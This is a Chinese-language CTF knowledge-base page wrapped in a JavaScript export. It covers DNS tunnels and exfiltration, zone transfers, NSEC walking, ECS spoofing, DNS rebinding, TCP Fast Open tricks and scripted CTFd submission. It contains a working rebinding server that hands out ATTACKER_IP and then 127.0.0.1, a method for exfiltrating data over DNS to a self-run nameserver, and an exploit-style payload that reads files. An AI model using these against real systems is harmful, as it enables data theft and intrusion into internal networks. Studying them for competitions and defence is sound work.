const n="杂项-DNS与网络怪题",e="杂项-DNS与网络怪题",t="两块内容：一是**把 DNS 当信道**（隧道、外带、隐蔽传输），二是**把 DNS/协议本身的语义当题**（zone transfer、rebinding、握手怪癖）。末尾附 CTFd 平台的无浏览器导航——比赛中不点鼠标也能查题、下附件、交 flag。",s=`# 杂项-DNS与网络怪题

> 两块内容：一是**把 DNS 当信道**（隧道、外带、隐蔽传输），二是**把 DNS/协议本身的语义当题**（zone transfer、rebinding、握手怪癖）。末尾附 CTFd 平台的无浏览器导航——比赛中不点鼠标也能查题、下附件、交 flag。

## 一、先分清是"信道"还是"语义"

| 类别 | 题目长什么样 | 核心动作 |
|---|---|---|
| DNS 当信道 | pcap 里大量奇怪子域名 / 你在做题却要往外发数据 | 提取子域 → 按编码还原；或自建回传通道 |
| DNS 语义题 | 给你一台 DNS 服务器/一个域名，问"下一条记录/隐藏域是什么" | zone transfer、NSEC 走链、ECS 伪造、rebinding |
| 协议层怪题 | 端口"扫不到"、握手就要带数据、非标端口跑怪协议 | 别信默认扫描器，手工发包 |
| 平台导航 | 要在 CTFd 上批量查题/交 flag | 走 REST API + token（见第八节） |

## 二、判据表：观察到什么 ⇒ 用什么

| 现象 | 手法 | 关键细节 |
|---|---|---|
| 子域名是 hex/base32/base64url 段 | DNS 隧道外带 | 按\`.\`切段，拼起来解码（先试 base32） |
| 要你"把 flag 送回攻击机"，但只有 DNS 出网 | 自建权威 NS，收 TXT/查询 | 数据进子域，响应走 TXT |
| \`dig AXFR\` 被拒 | 试 IXFR（含历史）、NSEC walking | IXFR=0 拿更新历史，删除的记录里有 flag |
| NSEC 记录指向下一个名字 | 依次 follows 枚举整区 | DNSSEC 区域才有效 |
| 解析结果随来源 IP 变 | ECS 伪造（\`+subnet=\`） | 试 \`10.13.37.0/24\` 之类内网段 |
| 同一域名多次解析返回不同 IP | 轮询 A 记录，重复查询去重 | 逐 IP 用正确 Host 头直连找隐藏后端 |
| 目标只允许白名单域访问内网 | DNS rebinding | 自控域、极低 TTL，第一次给你 IP、第二次给 127.0.0.1 |
| 端口"关闭/过滤"，但题面提 RFC 7413 | TCP Fast Open，数据塞在 SYN 里 | \`MSG_FASTOPEN\` 或 Scapy 手搓 SYN+payload |
| 需要连 CTF 平台批量操作 | CTFd REST API | API token 比 session 省事 |

## 三、DNS 隧道与外带

**识别（在 pcap 里）**：正常 DNS 查询名短且像单词；隧道题的查询名是**长而高熵**的编码段。用 tshark 抽出来：

\`\`\`bash
tshark -r capture.pcap -Y "dns.qry.type == 1" -T fields -e dns.qry.name | sort -u
tshark -r capture.pcap -Y "dns.qry.name contains '.evil.com'" -T fields -e dns.qry.name
tshark -r capture.pcap -Y "dns.qry.type == 16" -T fields -e dns.qry.name -e dns.txt   # TXT 回传
\`\`\`

**解码骨架**：子域段按顺序拼接，先猜编码。注意 base32 要用**大写**且补齐 \`=\`：

\`\`\`python
import base64
chunks = [q.split('.')[0] for q in queries if q.endswith('.evil.com')]
raw = ''.join(chunks)
for dec in (lambda s: base64.b32decode(s.upper() + '===='),
            lambda s: base64.b64decode(s + '=='),
            lambda s: bytes.fromhex(s)):
    try:
        print(dec(raw)); break
    except Exception:
        pass
\`\`\`

**外带（红队视角）**：没有出网 HTTP 但能出 DNS 时，把数据编进子域发往自建权威服务器；服务端用 TXT 响应回传命令。**要点**：单标签 ≤63 字节、域名总长有限，长数据要分片并带序号；先按一条已知短串校准分片与编码。

## 四、zone transfer / IXFR / NSEC / 子域枚举

\`\`\`bash
dig @ns.target.com target.com AXFR          # 标准全量传送
dig @server -p 5054 flag.example.com IXFR=0 # AXFR 被拒时，从 serial 0 拉历史
\`\`\`

**IXFR 输出读法**：diff 里成对的 SOA 夹住增删——旧 SOA 到新 SOA 之间是**被删除**的记录，新 SOA 之后是**新增**的。被删的 TXT 常常就是 flag 片段。这是"AXFR 挡住但历史没清"的常见漏洞。

**NSEC walking（有 DNSSEC 时）**：NSEC 记录指向**字典序的下一个**名字，顺着链走就能枚举整区（无需字典）：

\`\`\`python
import subprocess, re
def walk_nsec(server, port, base):
    cur, seen, out = base, set(), []
    while cur not in seen:
        seen.add(cur)
        txt = subprocess.check_output(["dig", f"@{server}", "-p", str(port),
                                       "ANY", cur, "+dnssec"], text=True)
        for m in re.finditer(r'TXT\\s+"([^"]*)"', txt):
            out.append((cur, m.group(1)))
        m = re.search(r'NSEC\\s+(\\S+)', txt)
        if not m: break
        cur = m.group(1).rstrip('.')
    return out
# 实战更快：用 dnspython 的 dns.query 直接发 ANY，别 subprocess dig
\`\`\`

**常规枚举**：\`for s in $(cat wl.txt); do dig +short "$s.target.com"; done\`；反向 \`dig -x 10.0.0.$i\`；先测**通配符**（\`dig randomnonexistent.target.com\`，有回应说明是泛解析，枚举时要过滤掉同一 IP）。

## 五、DNS Rebinding

**原理**：你控制 \`evil.com\` 并设 TTL=1；第一次解析返回**你自己的 IP**（浏览器加载到你的 JS），第二次解析返回**127.0.0.1/内网 IP**。因为两次都叫 \`evil.com\`，同源策略放行，你的 JS 就能读内网服务的响应。

\`\`\`python
# dnslib 最小 rebinding 服务器：奇数次给自己，偶数次给 127.0.0.1
from dnslib import DNSRecord, RR, A
from dnslib.server import DNSServer, BaseResolver
class Rebind(BaseResolver):
    def __init__(self): self.n = {}
    def resolve(self, req, handler):
        q = str(req.q.qname); self.n[q] = self.n.get(q, 0) + 1
        rep = req.reply()
        ip = "ATTACKER_IP" if self.n[q] % 2 else "127.0.0.1"
        rep.add_answer(RR(q, rdata=A(ip), ttl=1)); return rep
DNSServer(Rebind(), port=53).start()      # 本地起需 root；也可用公网 rebinding 服务
\`\`\`

**要点**：现代浏览器对私有 IP 有防护（PNA/rebinding 缓解），成功率取决于目标浏览器与是否用 HTTP 而非 HTTPS；题目若给了"自定义浏览器/旧 Chromium"通常才稳。工具：\`rbndr.us\`、singularity。

## 六、其他 DNS 语义怪题

- **ECS（EDNS Client Subnet）伪造**：服务器按来源网段返回不同记录时，用 ECS 假装来自内网。乐子网段优先试 \`10.13.37.0/24\`（1337），再试 \`10.0.0.0/8\`、\`172.16.0.0/12\`、\`192.168.0.0/16\`。

\`\`\`python
import dns.edns, dns.query, dns.message
q = dns.message.make_query("flag.example.com", "TXT", use_edns=True)
q.use_edns(0, 0, 8192, options=[dns.edns.ECSOption("10.13.37.1", 24, 0)])
r = dns.query.udp(q, "TARGET", port=5053, timeout=1.5)
for rrset in r.answer:
    for rd in rrset: print(b"".join(rd.strings).decode())
\`\`\`

- **轮询 A 记录隐藏后端**：同一域名配了多个后端，只有部分提供内容。查 50–100 次去重拿全部 IP，再逐 IP 用**正确的 Host 头**直连：

\`\`\`bash
for i in $(seq 1 100); do dig +short target.com A; done | sort -u > ips.txt
while read ip; do curl -s -m3 -H "Host: target.com" "http://$ip/" | grep -q flag && echo "$ip"; done < ips.txt
\`\`\`

- **DNS 编码迷宫（hxp 风格）**：每个节点是一个 UUID 子域，\`TXT\` 给节点数据，\`up/down/left/right.UUID.domain\` 的 CNAME 给邻接关系。**降维成图搜索**：节点 T、边 CNAME、数据 TXT，BFS 找含 flag 的节点。用 \`dnspython\` 而非 \`dig\`，并**本地缓存**（DNS 往返是瓶颈）。

## 七、协议层怪题：TCP Fast Open 的 SYN 载荷

**症状**：\`nmap -sS\`/\`nc -vz\` 显示端口关闭，但题面提到 "RFC 741x""fast open""knock with data"。TFO（RFC 7413）允许**在 SYN 包里就带数据**，服务端在握手完成前就处理它。普通扫描器不带数据，所以看不见。

\`\`\`python
import socket
MSG_FASTOPEN = 0x20000000      # Linux 需要 sysctl -w net.ipv4.tcp_fastopen=5
def tfo_send(host, port, payload, timeout=3.0):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(timeout)
    s.sendto(payload, MSG_FASTOPEN, (host, port))
    try: return s.recv(65536)
    finally: s.close()
print(tfo_send('10.13.37.99', 3737, b'SyN cat ./secret/file'))
# Scapy 备选（不需要内核 TFO cookie）：send(IP(dst=h)/TCP(dport=p,flags='S',seq=1)/payload)
\`\`\`

**坑**：服务端常拿 SYN 的**前几字节**当鉴权前缀（如上面的 \`SyN\`）——嗅探任意一个合法 SYN 就能看到。别用 \`nc\` 试，它不走 TFO。

## 八、CTFd 平台的无浏览器导航

CTFd 有完整 REST API，\`Authorization: Token <token>\` 比 session 省事。**token 需用户自己在 web 端 Settings → Access Tokens 生成**（Agent 拿不到默认令牌，先问用户要）。

\`\`\`bash
# 1) 认证自检
curl -s -H "Authorization: Token $CTF_TOKEN" "$CTF_URL/api/v1/users/me" | jq -r '.data.name'
# 2) 列题（含 id/分值/是否已解）
curl -s -H "Authorization: Token $CTF_TOKEN" "$CTF_URL/api/v1/challenges" | \\
  jq -r '.data[] | "\\(.id)\\t\\(.value)\\t\\(.category)\\t\\(.name)\\t(\\(.solves))"'
# 3) 读题 + 列附件
curl -s -H "Authorization: Token $CTF_TOKEN" "$CTF_URL/api/v1/challenges/$CID" | jq -r '.data.description'
curl -s -H "Authorization: Token $CTF_TOKEN" "$CTF_URL/api/v1/challenges/$CID" | jq -r '.data.files[]'
# 4) 下附件（文件 URL 带时限 token，403 就重新拉题面取新 URL）
curl -s -H "Authorization: Token $CTF_TOKEN" -o out.bin "\${CTF_URL}\${FILE_PATH}"
# 5) 交 flag
curl -s -X POST -H "Authorization: Token $CTF_TOKEN" -H "Content-Type: application/json" \\
  "$CTF_URL/api/v1/challenges/attempt" \\
  -d "{\\"challenge_id\\": $CID, \\"submission\\": \\"$FLAG\\"}" | jq -r '.data.status'
\`\`\`

**提交状态**：\`correct\` / \`incorrect\` / \`already_solved\` / \`ratelimited\` / \`paused\`。**默认限速 10 次错误/分钟**，爆破要留间隔。

**session 登录法**（没有 token 时）：先 \`GET /login\` 取隐藏 \`nonce\`，再 \`POST /login\` 带 \`name/password/nonce\`，之后用 cookie。判 CTFd：\`/api/v1/\` 有 Swagger、HTML 出现 \`/themes/core/\`、登录页有 \`name="nonce"\`。**动态容器题的 nc 地址常不在 API 里**，得看题面或专门的 instance API。

## 关键点

- **先分信道题还是语义题**：前者是编码/协议问题，后者是 DNS 特性问题，不要混。
- DNS 隧道解码按顺序试编码——**base32 要 upper + 补 \`=\`**；外带时分片 + 序号。
- AXFR 被拒先试 **IXFR=0**，再看是否 DNSSEC（**NSEC walking** 可免字典枚举）。
- Rebinding 靠**自控域 + TTL=1 + 一读一换 IP**；成败看浏览器防护与是否 HTTP。
- 端口"扫不到"别放弃：思考 TFO 的 SYN 载荷或非标协议，手工发包。
- 平台上别用鼠标：**CTFd 全程可 API 化**，但 token 要先向用户要，注意 10 次/分钟限速。

## 关联

- [[杂项-取证与流量分析]] —— DNS 隧道/隐蔽信道的 pcap 提取与解码是那边"按协议分头看"的具体一条。
- [[杂项-隐写与编码]] —— 子域里剥出的编码串走那页的编码识别流程。
- [[Web-请求走私与协议层攻击]] —— TFO、非标协议、握手怪癖与"走私/协议层"是同一类思维。
- [[Web-SSRF与XXE]] —— DNS rebinding 常用于打 SSRF 的 IP 白名单。
- [[OSINT-开源情报]] —— 子域枚举、DNS 记录、云资产发现是 OSINT 的常规入口。
- [[CTF-常用工具清单]] —— dig/dnspython/tshark/Scapy 的位置与用法。

## 存疑 / 矛盾

- **NSEC walking 只对"未开启 NSEC3"的区有效**：NSEC3 用哈希名，无法顺序走链，得改用 NSEC3 枚举（收集哈希再爆破）。别把 NSEC 脚本套在 NSEC3 区上，会一无所获。
- **ECS 是否生效取决于服务器真的按客户端网段分记录**：加了 \`+subnet=\` 没变化不代表题目不考它，可能只是网段猜错；反之也可能服务器根本不看 ECS。
- **DNS rebinding 在真实浏览器上成功率不稳定**：DNS pinning、PNA、HTTPS 证书都会拦；题里通常放宽（HTTP、旧浏览器、自控客户端）才可行。
- **TFO 的 \`MSG_FASTOPEN\` 需内核支持且客户端 TFO 打开**（\`net.ipv4.tcp_fastopen\` 的 bit0/bit2）；沙箱里常不可用，此时用 Scapy 手搓 SYN+payload 更可靠——但某些环境拦原始套接字。
- **CTFd 的文件下载 URL 有时限**：403 不一定是权限错，先重取题面刷新 URL；动态实例题的连接信息常见于题面而非 API 字段。
- 本页多条（IXFR、NSEC、ECS）出自 Nullcon 2026 系列 writeup，**具体端口/serial/网段随题而变**，判据比常量更耐用。

## 来源

- 糯米内建知识整理 · 2026-10-03，提炼自 ctf-misc skill \`dns.md\` 与 \`ctfd-navigation.md\`（Nullcon 2026 ECS/NSEC/IXFR、hxp 2017 DNS maze、EKOPARTY 2017 round-robin、Insomnihack 2019 TCP Fast Open；CTFd REST API）。
`,r="concept",o="misc",a={internal:["CTF-常用工具清单","OSINT-开源情报","Web-SSRF与XXE","Web-请求走私与协议层攻击","杂项-取证与流量分析","杂项-隐写与编码"],unresolvedCount:0},i={name:n,title:e,summary:t,content:s,section:r,group:o,links:a};export{s as content,i as default,o as group,a as links,n as name,r as section,t as summary,e as title};
